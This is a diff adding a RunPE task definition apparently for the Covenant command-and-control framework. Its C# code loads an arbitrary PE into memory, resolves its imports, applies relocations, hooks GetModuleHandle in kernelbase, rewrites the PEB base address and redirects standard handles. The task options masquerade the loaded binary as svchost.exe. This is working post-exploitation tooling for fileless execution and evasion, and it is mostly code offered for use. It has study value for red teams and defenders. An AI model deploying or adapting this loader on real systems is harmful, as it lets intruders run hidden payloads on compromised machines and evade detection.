+
+    {
+        internal class ExtraAPIPatcher
+        {
+            private byte[] _originalGetModuleHandleBytes;
+            private string _getModuleHandleFuncName;
+            private IntPtr _newFuncAlloc;
+            private int _newFuncBytesCount;
+
+            public bool PatchAPIs(IntPtr baseAddress)
+            {
+                _getModuleHandleFuncName = Encoding.UTF8.Equals(Program.encoding) ? "GetModuleHandleW" : "GetModuleHandleA";
+
+                var moduleHandle = NativeDeclarations.GetModuleHandle("kernelbase");
+                var getModuleHandleFuncAddress = NativeDeclarations.GetProcAddress(moduleHandle, _getModuleHandleFuncName);
+                var patchLength = CalculatePatchLength(getModuleHandleFuncAddress);
+                WriteNewFuncToMemory(baseAddress, getModuleHandleFuncAddress, patchLength);
+
+                if (PatchAPIToJmpToNewFunc(patchLength)) return true;
+                return false;
+            }
+
+            private bool PatchAPIToJmpToNewFunc(int patchLength)
+            {
+                // Patch the API to jump to out new func code
+                var pointerBytes = BitConverter.GetBytes(_newFuncAlloc.ToInt64());
+
+                var patchBytes = new List<byte> { 0x48, 0xB8 };
+                patchBytes.AddRange(pointerBytes);
+
+                patchBytes.Add(0xFF);
+                patchBytes.Add(0xE0);
+
+                if (patchBytes.Count > patchLength)
+                    throw new Exception($"Patch length ({patchBytes.Count})is greater than calculated space available ({patchLength})");
+
+                if (patchBytes.Count < patchLength)
+                {
+                    patchBytes.AddRange(Enumerable.Range(0, patchLength - patchBytes.Count).Select(x => (byte)0x90));
+                }
+
+                _originalGetModuleHandleBytes =
+                    Utils.PatchFunction("kernelbase", _getModuleHandleFuncName, patchBytes.ToArray());
+
+                return _originalGetModuleHandleBytes != null;
+            }
+
+            private IntPtr WriteNewFuncToMemory(IntPtr baseAddress, IntPtr getModuleHandleFuncAddress, int patchLength)
+            {
+                // Write some code to memory that will return our base address if arg0 is null or revert back to GetModuleAddress if not.
+                var newFuncBytes = new List<byte>
+                {
+                    0x48, 0x85, 0xc9, 0x75, 0x0b,
+                    0x48,
+                    0xB8
+                };
+
+                var baseAddressPointerBytes = BitConverter.GetBytes(baseAddress.ToInt64());
+
+                newFuncBytes.AddRange(baseAddressPointerBytes);
+
+                newFuncBytes.Add(0xC3);
+                newFuncBytes.Add(0x48);
+                newFuncBytes.Add(0xB8);
+
+
+                var pointerBytes = BitConverter.GetBytes(getModuleHandleFuncAddress.ToInt64() + patchLength);
+
+                newFuncBytes.AddRange(pointerBytes);
+
+                var originalInstructions = new byte[patchLength];
+                Marshal.Copy(getModuleHandleFuncAddress, originalInstructions, 0, patchLength);
+                // TODO how to fix up relative jmps in the trampoline
+                newFuncBytes.AddRange(originalInstructions);
+
+                newFuncBytes.Add(0xFF);
+                newFuncBytes.Add(0xE0);
+
+                _newFuncAlloc = NativeDeclarations.VirtualAlloc(IntPtr.Zero, (uint)newFuncBytes.Count,
+                    NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
+
+                Marshal.Copy(newFuncBytes.ToArray(), 0, _newFuncAlloc, newFuncBytes.Count);
+                _newFuncBytesCount = newFuncBytes.Count;
+
+                NativeDeclarations.VirtualProtect(_newFuncAlloc, (UIntPtr)newFuncBytes.Count,
+                    NativeDeclarations.PAGE_EXECUTE_READ, out _);
+                return _newFuncAlloc;
+            }
+
+            private int CalculatePatchLength(IntPtr funcAddress)
+            {
+                var bytes = Utils.ReadMemory(funcAddress, 40);
+                var searcher = new BoyerMoore(new byte[] { 0x48, 0x8d, 0x4c });
+                var length = searcher.Search(bytes).FirstOrDefault();
+                if (length == 0)
+                {
+                    searcher = new BoyerMoore(new byte[] { 0x4c, 0x8d, 0x44 });
+                    length = searcher.Search(bytes).FirstOrDefault();
+                    if (length == 0)
+                        throw new Exception("Unable to calculate patch length, the function may have changed to a point it is is no longer recognised and this code needs to be updated");
+                }
+                return length;
+            }
+
+            public bool RevertAPIs()
+            {
+                Utils.PatchFunction("kernelbase", _getModuleHandleFuncName, _originalGetModuleHandleBytes);
+                Utils.ZeroOutMemory(_newFuncAlloc, _newFuncBytesCount);
+                Utils.FreeMemory(_newFuncAlloc);
+                return true;
+            }
+        }
+
+        public sealed class BoyerMoore
+        {
+            private readonly byte[] _needle;
+            private readonly int[] _charTable;
+            private readonly int[] _offsetTable;
+
+            public BoyerMoore(byte[] needle)
+            {
+                _needle = needle;
+                _charTable = MakeByteTable(needle);
+                _offsetTable = MakeOffsetTable(needle);
+            }
+
+            public IEnumerable<int> Search(byte[] haystack)
+            {
+                if (_needle.Length == 0)
+                    yield break;
+
+                for (var i = _needle.Length - 1; i < haystack.Length;)
+                {
+                    int j;
+
+                    for (j = _needle.Length - 1; _needle[j] == haystack[i]; --i, --j)
+                    {
+                        if (j != 0)
+                            continue;
+
+                        yield return i;
+                        i += _needle.Length - 1;
+                        break;
+                    }
+
+                    i += Math.Max(_offsetTable[_needle.Length - 1 - j], _charTable[haystack[i]]);
+                }
+            }
+
+            private static int[] MakeByteTable(IList<byte> needle)
+            {
+                const int alphabetSize = 256;
+                var table = new int[alphabetSize];
+
+                for (var i = 0; i < table.Length; ++i)
+                    table[i] = needle.Count;
+
+                for (var i = 0; i < needle.Count - 1; ++i)
+                    table[needle[i]] = needle.Count - 1 - i;
+
+                return table;
+            }
+
+            private static int[] MakeOffsetTable(IList<byte> needle)
+            {
+                var table = new int[needle.Count];
+                var lastPrefixPosition = needle.Count;
+
+                for (var i = needle.Count - 1; i >= 0; --i)
+                {
+                    if (IsPrefix(needle, i + 1))
+                        lastPrefixPosition = i + 1;
+
+                    table[needle.Count - 1 - i] = lastPrefixPosition - i + needle.Count - 1;
+                }
+
+                for (var i = 0; i < needle.Count - 1; ++i)
+                {
+                    var suffixLength = SuffixLength(needle, i);
+                    table[suffixLength] = needle.Count - 1 - i + suffixLength;
+                }
+
+                return table;
+            }
+
+            private static bool IsPrefix(IList<byte> needle, int p)
+            {
+                for (int i = p, j = 0; i < needle.Count; ++i, ++j)
+                    if (needle[i] != needle[j])
+                        return false;
+
+                return true;
+            }
+
+            private static int SuffixLength(IList<byte> needle, int p)
+            {
+                var len = 0;
+
+                for (int i = p, j = needle.Count - 1; i >= 0 && needle[i] == needle[j]; --i, --j)
+                    ++len;
+
+                return len;
+            }
+        }
+    }
+
+
+    namespace RunPE.Patchers
+
+    {
+        internal class ExtraEnvironmentPatcher
+        {
+            private const int PEB_BASE_ADDRESS_OFFSET = 0x10;
+
+            private IntPtr _pOriginalPebBaseAddress;
+            private IntPtr _pPEBBaseAddr;
+
+            private IntPtr _newPEBaseAddress;
+
+            public ExtraEnvironmentPatcher(IntPtr newPEBaseAddress)
+            {
+                _newPEBaseAddress = newPEBaseAddress;
+            }
+
+            internal bool PerformExtraEnvironmentPatches()
+            {
+                return PatchPebBaseAddress();
+            }
+
+            private bool PatchPebBaseAddress()
+            {
+                _pPEBBaseAddr = (IntPtr)(Utils.GetPointerToPeb().ToInt64() + PEB_BASE_ADDRESS_OFFSET);
+                _pOriginalPebBaseAddress = Marshal.ReadIntPtr(_pPEBBaseAddr);
+                if (!Utils.PatchAddress(_pPEBBaseAddr, _newPEBaseAddress))
+                {
+                    return false;
+                }
+                return true;
+            }
+
+            internal bool RevertExtraPatches()
+            {
+                if (!Utils.PatchAddress(_pPEBBaseAddr, _pOriginalPebBaseAddress))
+                {
+                    return false;
+                }
+                return true;
+            }
+        }
+    }
+
+
+    namespace RunPE.Patchers
+
+    {
+        internal class FileDescriptorPair
+        {
+            public IntPtr Read { get; set; }
+
+            public IntPtr Write { get; set; }
+        }
+
+        internal class FileDescriptorRedirector
+        {
+            private const int STD_INPUT_HANDLE = -10;
+            private const int STD_OUTPUT_HANDLE = -11;
+            private const int STD_ERROR_HANDLE = -12;
+            private const uint BYTES_TO_READ = 1024;
+
+            private IntPtr _oldGetStdHandleOut;
+            private IntPtr _oldGetStdHandleIn;
+            private IntPtr _oldGetStdHandleError;
+
+            private FileDescriptorPair _kpStdOutPipes;
+            private FileDescriptorPair _kpStdInPipes;
+            private Task<string> _readTask;
+
+            public bool RedirectFileDescriptors()
+            {
+                _oldGetStdHandleOut = GetStdHandleOut();
+                _oldGetStdHandleIn = GetStdHandleIn();
+                _oldGetStdHandleError = GetStdHandleError();
+                _kpStdOutPipes = CreateFileDescriptorPipes();
+                if (_kpStdOutPipes == null)
+                {
+                    Task.output += "\n[-] Unable to create STDOut Pipes\n";
+                    return false;
+                }
+
+                _kpStdInPipes = CreateFileDescriptorPipes();
+                if (_kpStdInPipes == null)
+                {
+                    Task.output += "\n[-] Unable to create STDIn Pipes\n";
+                    return false;
+                }
+
+                if (!RedirectDescriptorsToPipes(_kpStdOutPipes.Write, _kpStdInPipes.Write, _kpStdOutPipes.Write))
+                {
+                    Task.output += "\n[-] Unable to redirect descriptors to pipes\n";
+                    return false;
+                }
+                return true;
+            }
+
+            public string ReadDescriptorOutput()
+            {
+                while (!_readTask.IsCompleted)
+                {
+                    Thread.Sleep(2000);
+                }
+
+                return _readTask.Result;
+            }
+
+            public void ResetFileDescriptors()
+            {
+                RedirectDescriptorsToPipes(_oldGetStdHandleOut, _oldGetStdHandleIn, _oldGetStdHandleError);
+                ClosePipes();
+            }
+
+            private static IntPtr GetStdHandleOut()
+            {
+                return NativeDeclarations.GetStdHandle(STD_OUTPUT_HANDLE);
+            }
+
+            private static IntPtr GetStdHandleError()
+            {
+                return NativeDeclarations.GetStdHandle(STD_ERROR_HANDLE);
+            }
+
+            internal void ClosePipes()
+            {
+                CloseDescriptors(_kpStdOutPipes);
+                CloseDescriptors(_kpStdInPipes);
+            }
+
+            internal void StartReadFromPipe()
+            {
+                _readTask = System.Threading.Tasks.Task.Factory.StartNew(() =>
+                {
+                    var output = "";
+
+                    var buffer = new byte[BYTES_TO_READ];
+                    byte[] outBuffer;
+
+                    var ok = NativeDeclarations.ReadFile(_kpStdOutPipes.Read, buffer, BYTES_TO_READ, out var bytesRead, IntPtr.Zero);
+
+                    if (!ok)
+                    {
+                        Task.output += "\n[-] Unable to read from 'subprocess' pipe\n";
+                        return "";
+                    }
+                    if (bytesRead != 0)
+                    {
+                        outBuffer = new byte[bytesRead];
+                        Array.Copy(buffer, outBuffer, bytesRead);
+                        output += Encoding.Default.GetString(outBuffer);
+                    }
+
+                    while (ok)
+                    {
+                        ok = NativeDeclarations.ReadFile(_kpStdOutPipes.Read, buffer, BYTES_TO_READ, out bytesRead, IntPtr.Zero);
+                        if (bytesRead != 0)
+                        {
+                            outBuffer = new byte[bytesRead];
+                            Array.Copy(buffer, outBuffer, bytesRead);
+                            output += Encoding.Default.GetString(outBuffer);
+                        }
+                    }
+
+                    return output;
+                });
+            }
+
+            private static IntPtr GetStdHandleIn()
+            {
+                return NativeDeclarations.GetStdHandle(STD_INPUT_HANDLE);
+            }
+
+            private static void CloseDescriptors(FileDescriptorPair stdoutDescriptors)
+            {
+                try
+                {
+                    // Need to close write before read else it hangs as could still be writing
+                    if (stdoutDescriptors.Write != IntPtr.Zero)
+                    {
+                        NativeDeclarations.CloseHandle(stdoutDescriptors.Write);
+                    }
+
+                    if (stdoutDescriptors.Read != IntPtr.Zero)
+                    {
+                        NativeDeclarations.CloseHandle(stdoutDescriptors.Read);
+                    }
+                }
+                catch (Exception e)
+                {
+                    Task.output += $"\n[-] Error closing handles: {e}\n";
+                    Task.output += $"\nLast error: 0x{NativeDeclarations.GetLastError():X}\n";
+                }
+            }
+
+            private static FileDescriptorPair CreateFileDescriptorPipes()
+            {
+                var lpSecurityAttributes = new NativeDeclarations.SECURITY_ATTRIBUTES();
+                lpSecurityAttributes.nLength = Marshal.SizeOf(lpSecurityAttributes);
+                lpSecurityAttributes.bInheritHandle = 1;
+
+                var outputStdOut = NativeDeclarations.CreatePipe(out var read, out var write, ref lpSecurityAttributes, 0);
+                if (!outputStdOut)
+                {
+                    return null;
+                }
+                return new FileDescriptorPair
+                {
+                    Read = read,
+                    Write = write
+                };
+            }
+
+            private static bool RedirectDescriptorsToPipes(IntPtr hStdOutPipes, IntPtr hStdInPipes, IntPtr hStdErrPipes)
+            {
+                var bStdOut = NativeDeclarations.SetStdHandle(STD_OUTPUT_HANDLE, hStdOutPipes);
+                if (bStdOut)
+                {
+
+                }
+                else
+                {
+                    return false;
+                }
+
+                var bStdError = NativeDeclarations.SetStdHandle(STD_ERROR_HANDLE, hStdErrPipes);
+                if (bStdError)
+                {
+
+                }
+                else
+                {
+                    return false;
+                }
+
+                var bStdIn = NativeDeclarations.SetStdHandle(STD_INPUT_HANDLE, hStdInPipes);
+                if (bStdIn)
+                {
+
+                }
+                else
+                {
+                    return false;
+                }
+
+                return true;
+            }
+        }
+    }
+
+
+    namespace RunPE.Patchers
+
+    {
+        internal class ImportResolver
+        {
+            [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+            private static extern bool FreeLibrary(IntPtr hModule);
+
+            private const int IDT_SINGLE_ENTRY_LENGTH = 20;
+            private const int IDT_IAT_OFFSET = 16;
+            private const int IDT_DLL_NAME_OFFSET = 12;
+            private const int ILT_HINT_LENGTH = 2;
+
+            private readonly List<string> _originalModules = new List<string>();
+
+            public void ResolveImports(PELoader pe, long currentBase)
+            {
+                var currentProcess = Process.GetCurrentProcess();
+                foreach (ProcessModule module in currentProcess.Modules)
+                {
+                    _originalModules.Add(module.ModuleName);
+                }
+
+                // Resolve Imports
+                var pIDT = (IntPtr)(currentBase + pe.OptionalHeader64.ImportTable.VirtualAddress);
+                var dllIterator = 0;
+                while (true)
+                {
+                    var pDLLImportTableEntry = (IntPtr)(pIDT.ToInt64() + IDT_SINGLE_ENTRY_LENGTH * dllIterator);
+
+                    var iatRVA = Marshal.ReadInt32((IntPtr)(pDLLImportTableEntry.ToInt64() + IDT_IAT_OFFSET));
+                    var pIAT = (IntPtr)(currentBase + iatRVA);
+
+                    var dllNameRVA = Marshal.ReadInt32((IntPtr)(pDLLImportTableEntry.ToInt64() + IDT_DLL_NAME_OFFSET));
+                    var pDLLName = (IntPtr)(currentBase + dllNameRVA);
+                    var dllName = Marshal.PtrToStringAnsi(pDLLName);
+
+                    if (string.IsNullOrEmpty(dllName))
+                    {
+                        break;
+                    }
+
+                    var handle = NativeDeclarations.LoadLibrary(dllName);
+                    if (handle == IntPtr.Zero)
+                    {
+                        throw new Exception($"Unable to load dependency: {dllName}, Last error: 0x{NativeDeclarations.GetLastError():X}");
+                    }
+
+                    var pCurrentIATEntry = pIAT;
+                    while (true)
+                    {
+                        // For each DLL iterate over its functions in the IAT and patch the IAT with the real address https://tech-zealots.com/malware-analysis/journey-towards-import-address-table-of-an-executable-file/
+                        var pDLLFuncName =
+                            (IntPtr)(currentBase + Marshal.ReadInt32(pCurrentIATEntry) +
+                                     ILT_HINT_LENGTH); // Skip two byte 'hint' http://sandsprite.com/CodeStuff/Understanding_imports.html
+                        var dllFuncName = Marshal.PtrToStringAnsi(pDLLFuncName);
+
+                        if (string.IsNullOrEmpty(dllFuncName))
+                        {
+                            break;
+                        }
+
+                        var pRealFunction = NativeDeclarations.GetProcAddress(handle, dllFuncName);
+                        if (pRealFunction == IntPtr.Zero)
+                        {
+                            throw new Exception($"Unable to find procedure {dllName}!{dllFuncName}");
+                        }
+                        Marshal.WriteInt64(pCurrentIATEntry, pRealFunction.ToInt64());
+
+                        pCurrentIATEntry =
+                            (IntPtr)(pCurrentIATEntry.ToInt64() +
+                                     IntPtr.Size); // Shift the current entry to point to the next entry along, as each entry is just a pointer this is one IntPtr.Size
+                    }
+
+                    dllIterator++;
+                }
+            }
+
+            internal void ResetImports()
+            {
+                var currentProcess = Process.GetCurrentProcess();
+                foreach (ProcessModule module in currentProcess.Modules)
+                {
+                    if (!_originalModules.Contains(module.ModuleName))
+                    {
+                        if (!FreeLibrary(module.BaseAddress))
+                        {
+
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+
+    namespace RunPE.Patchers
+
+    {
+        internal class PEMapper
+        {
+            private IntPtr _codebase;
+            private PELoader _pe;
+
+            public void MapPEIntoMemory(byte[] unpacked, out PELoader peLoader, out long currentBase)
+            {
+                _pe = peLoader = new PELoader(unpacked);
+                _codebase = NativeDeclarations.VirtualAlloc(IntPtr.Zero, _pe.OptionalHeader64.SizeOfImage,
+                    NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
+                currentBase = _codebase.ToInt64();
+
+                // Copy Sections
+                for (var i = 0; i < _pe.FileHeader.NumberOfSections; i++)
+                {
+                    var y = NativeDeclarations.VirtualAlloc((IntPtr)(currentBase + _pe.ImageSectionHeaders[i].VirtualAddress),
+                        _pe.ImageSectionHeaders[i].SizeOfRawData, NativeDeclarations.MEM_COMMIT, NativeDeclarations.PAGE_READWRITE);
+                    if (_pe.ImageSectionHeaders[i].SizeOfRawData > 0)
+                    {
+                        Marshal.Copy(_pe.RawBytes, (int)_pe.ImageSectionHeaders[i].PointerToRawData, y, (int)_pe.ImageSectionHeaders[i].SizeOfRawData);
+                    }
+                }
+
+                // Perform Base Relocation
+                var delta = currentBase - (long)_pe.OptionalHeader64.ImageBase;
+
+                // Modify Memory Based On Relocation Table
+                var relocationTable =
+                    (IntPtr)(currentBase + (int)_pe.OptionalHeader64.BaseRelocationTable.VirtualAddress);
+                var relocationEntry = (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(relocationTable, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
+
+                var imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
+                var nextEntry = relocationTable;
+                var sizeofNextBlock = (int)relocationEntry.SizeOfBlock;
+                var offset = relocationTable;
+
+                while (true)
+                {
+                    var pRelocationTableNextBlock = (IntPtr)(relocationTable.ToInt64() + sizeofNextBlock);
+
+                    var relocationNextEntry =
+                        (NativeDeclarations.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(pRelocationTableNextBlock, typeof(NativeDeclarations.IMAGE_BASE_RELOCATION));
+
+                    var pRelocationEntry = (IntPtr)(currentBase + relocationEntry.VirtualAdress);
+
+                    for (var i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++) // TODO figure out magic numbers
+                    {
+                        var value = (ushort)Marshal.ReadInt16(offset, 8 + 2 * i); // TODO figure out magic numbers
+                        var type = (ushort)(value >> 12); // TODO figure out magic numbers
+                        var fixup = (ushort)(value & 0xfff); // TODO figure out magic numbers
+
+                        switch (type)
+                        {
+                            case 0x0:
+                                break;
+                            case 0xA:
+                                var patchAddress = (IntPtr)(pRelocationEntry.ToInt64() + fixup);
+                                var originalAddr = Marshal.ReadInt64(patchAddress);
+                                Marshal.WriteInt64(patchAddress, originalAddr + delta);
+                                break;
+                        }
+                    }
+
+                    offset = (IntPtr)(relocationTable.ToInt64() + sizeofNextBlock);
+                    sizeofNextBlock += (int)relocationNextEntry.SizeOfBlock;
+                    relocationEntry = relocationNextEntry;
+                    nextEntry = (IntPtr)(nextEntry.ToInt64() + sizeofNextBlock);
+
+                    if (relocationNextEntry.SizeOfBlock == 0)
+                    {
+                        break;
+                    }
+                }
+            }
+
+            internal void ClearPE()
+            {
+                var size = _pe.OptionalHeader64.SizeOfImage;
+                Utils.ZeroOutMemory(_codebase, (int)size);
+                Utils.FreeMemory(_codebase);
+            }
+
+            internal void SetPagePermissions()
+            {
+                for (var i = 0; i < _pe.FileHeader.NumberOfSections; i++)
+                {
+                    var execute = ((uint)_pe.ImageSectionHeaders[i].Characteristics & NativeDeclarations.IMAGE_SCN_MEM_EXECUTE) != 0;
+                    var read = ((uint)_pe.ImageSectionHeaders[i].Characteristics & NativeDeclarations.IMAGE_SCN_MEM_READ) != 0;
+                    var write = ((uint)_pe.ImageSectionHeaders[i].Characteristics & NativeDeclarations.IMAGE_SCN_MEM_WRITE) != 0;
+
+                    var protection = NativeDeclarations.PAGE_EXECUTE_READWRITE;
+
+                    if (execute && read && write)
+                    {
+                        protection = NativeDeclarations.PAGE_EXECUTE_READWRITE;
+                    }
+                    else if (!execute && read && write)
+                    {
+                        protection = NativeDeclarations.PAGE_READWRITE;
+                    }
+                    else if (!write && execute && read)
+                    {
+                        protection = NativeDeclarations.PAGE_EXECUTE_READ;
+                    }
+                    else if (!execute && !write && read)
+                    {
+                        protection = NativeDeclarations.PAGE_READONLY;
+                    }
+                    else if (execute && !read && !write)
+                    {
+                        protection = NativeDeclarations.PAGE_EXECUTE;
+                    }
+                    else if (!execute && !read && !write)
+                    {
+                        protection = NativeDeclarations.PAGE_NOACCESS;
+                    }
+
+                    var y = NativeDeclarations.VirtualProtect((IntPtr)(_codebase.ToInt64() + _pe.ImageSectionHeaders[i].VirtualAddress),
+                        (UIntPtr)_pe.ImageSectionHeaders[i].SizeOfRawData, protection, out _);
+                }
+            }
+        }
+    }
+  Compiled: false
+  TaskingType: Assembly
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: System.Core.dll
+    Location: net35/System.Core.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35/System.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net35/mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net40/System.Core.dll
+    DotNetVersion: Net40
+  - Name: System.dll
+    Location: net40/System.dll
+    DotNetVersion: Net40
+  - Name: mscorlib.dll
+    Location: net40/mscorlib.dll
+    DotNetVersion: Net40
+  EmbeddedResources: []
+  UnsafeCompile: true
+  TokenTask: false
+  Options:
+  - Name: DecoyFilePath
+    Value: C:\Windows\System32\svchost.exe
+    DefaultValue: ''
+    Description: File to pretend to be
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+    GruntTaskId: 103
+  - Name: FileContent
+    Value: 
+    DefaultValue: ''
+    Description: PE to execute
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: true
+    GruntTaskId: 103
+  - Name: Arguments
+    Value: coffee
+    DefaultValue: ''
+    Description: Arguments for the executed PE
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+    GruntTaskId: 103
